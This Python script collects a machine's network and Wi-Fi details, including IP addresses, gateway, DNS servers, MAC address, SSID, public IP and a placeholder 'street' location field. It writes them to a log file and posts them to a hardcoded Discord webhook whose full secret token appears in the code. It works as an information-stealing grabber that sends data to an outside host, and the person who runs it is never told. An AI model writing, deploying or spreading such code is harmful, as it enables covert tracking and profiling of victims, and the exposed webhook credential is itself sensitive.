import subprocess
import requests
import json
import netifaces

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'

# Function to send message to Discord webhook
def send_to_discord(message):
    headers = {'Content-Type': 'application/json'}
    payload = json.dumps({'content': message})
    response = requests.post(webhook_url, headers=headers, data=payload)
    if response.status_code == 204:
        print(f"Message sent successfully to Discord webhook.")
    else:
        print(f"Failed to send message to Discord webhook. Status code: {response.status_code}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get detailed network information
def get_network_info():
    interfaces = netifaces.interfaces()
    wlan_info = None
    for iface in interfaces:
        if 'wlan' in iface:
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                wlan_info = addrs[netifaces.AF_INET][0]
                wlan_info['interface'] = iface
                break
    return wlan_info

# Function to get SSID and additional network details
def get_wifi_details():
    ssid = execute_command('iwgetid -r')
    signal_strength = execute_command('iwconfig 2>&1 | grep Signal | cut -d "=" -f 3 | cut -d " " -f 1')
    # Placeholder for street name - not directly available via standard commands
    street = ''  

    return {
        'ssid': ssid,
        'signal_strength': signal_strength,
        'street': street,
    }

# Function to get public IP address
def get_public_ip():
    ip = execute_command('curl -s https://api64.ipify.org')
    return ip

# Function to get detailed network information
def get_detailed_network_info():
    gateway = execute_command('ip route | grep default | awk \'/default/ {print $3}\'')
    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver | awk \'{print $2}\'')
    mac_address = execute_command('cat /sys/class/net/wlan0/address')

    return {
        'gateway': gateway,
        'dns_servers': dns_servers,
        'mac_address': mac_address,
    }

# Collect detailed network and WiFi information
wlan_info = get_network_info()
wifi_details = get_wifi_details()
network_info = get_detailed_network_info()
public_ip = get_public_ip()

# Write collected information to log.txt
with open('log.txt', 'w') as f:
    f.write("=== WLAN Network Information ===\n")
    f.write(f"Interface: {wlan_info['interface']}\n")
    f.write(f"IP Address: {wlan_info['addr']}\n")
    f.write(f"Netmask: {wlan_info['netmask']}\n")
    f.write(f"Broadcast Address: {wlan_info['broadcast']}\n")
    f.write(f"Gateway: {network_info['gateway']}\n")
    f.write(f"DNS Servers: {network_info['dns_servers']}\n")
    f.write(f"MAC Address: {network_info['mac_address']}\n")
    f.write(f"SSID: {wifi_details['ssid']}\n")
    f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
    f.write(f"Public IP Address: {public_ip}\n")
    f.write(f"Street: {wifi_details['street']}\n\n")

# Send log.txt content to Discord webhook
with open('log.txt', 'r') as f:
    log_content = f.read()

send_to_discord(f"```{log_content}```")